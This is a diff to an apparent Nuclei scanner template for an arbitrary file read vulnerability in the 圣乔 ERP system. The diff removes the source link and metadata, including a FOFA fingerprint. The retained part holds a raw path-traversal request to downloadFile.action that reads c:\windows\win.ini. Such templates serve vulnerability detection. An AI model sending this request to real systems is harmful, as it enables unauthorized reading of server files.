@@ -3,12 +3,8 @@ info:
   name: 圣乔ERP系统downloadFile存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ls1fmsl4k14g7qui'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ls1fmsl4k14g7qui
-    fofa: app="圣乔-ERP系统"
 http:
 - raw:
   - 'GET /erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\win.ini HTTP/1.1
